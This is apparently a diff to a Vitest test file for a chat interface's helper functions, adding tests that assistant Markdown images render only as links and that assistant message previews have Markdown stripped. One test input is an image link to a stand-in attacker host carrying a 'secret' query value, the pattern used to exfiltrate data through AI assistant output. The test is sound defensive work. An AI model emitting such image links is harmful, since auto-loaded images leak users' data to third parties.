@@ -5,10 +5,11 @@
  * 时间相关用例一律 vi.setSystemTime 固定“现在”。应用时区没设时跟随浏览器，这时用不带时区标记的 ISO 串作为输入
  * （`2026-08-27T09:05:00` 按本地时区解析），结果与本机时区无关；设了应用时区的用例用 UTC 时刻作为输入
  */
+import { createStreamRenderer } from '@xihan-ui/markdown'
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
 import { ApiError } from '~/request'
 import { setDisplayTimeZone } from '~/utils'
-import { chatErrorText, formatConversationTime, formatFileSize, formatMessageTime, hasReadReceipt, messageBodyLabel } from './components/chat-helpers'
+import { assistantMarkdownSource, chatErrorText, formatConversationTime, formatFileSize, formatMessageTime, hasReadReceipt, messageBodyLabel, previewText } from './components/chat-helpers'
 
 /** 测试用翻译器：直接回显 key，便于断言走到了 i18n 分支 */
 function echoTranslate(key: string): string {
@@ -291,5 +292,24 @@ describe('chatErrorText 报错文案', () => {
     expect(chatErrorText(new Error('网络断了'))).toBe('网络断了')
     expect(chatErrorText('oops')).toBe('')
     expect(chatErrorText(undefined)).toBe('')
+  })
+})
+
+describe('助手回复', () => {
+  it('图片语法不会变成自动加载的图片，只留成链接', () => {
+    const renderer = createStreamRenderer({ idPrefix: 'test-' })
+    const rendered = JSON.stringify(renderer.render(assistantMarkdownSource('看这个 ![秘密](https://evil.example/x?q=secret)'), { ended: true }))
+    renderer.dispose()
+    expect(rendered).not.toContain('<img')
+    expect(rendered).toContain('https://evil.example/x?q=secret')
+  })
+
+  it('助手会话的预览去掉 Markdown 标记，别的会话照原文', () => {
+    const markdown = '**答案：**\n\n- `admin` 与 [文档](https://x.example)\n\n| a | b |\n|---|---|\n| 1 | 2 |'
+    expect(previewText('Assistant', markdown)).toBe('答案： admin 与 文档 a b 1 2')
+    expect(previewText('Single', markdown)).toBe(markdown)
+    expect(previewText(undefined, '**x**')).toBe('**x**')
+    // 列表预览是后端截断过的：强调与没写完的链接也不留标记
+    expect(previewText('Assistant', '共有 *5* 个，见 ![图](https://evil.')).toBe('共有 5 个，见 图')
   })
 })
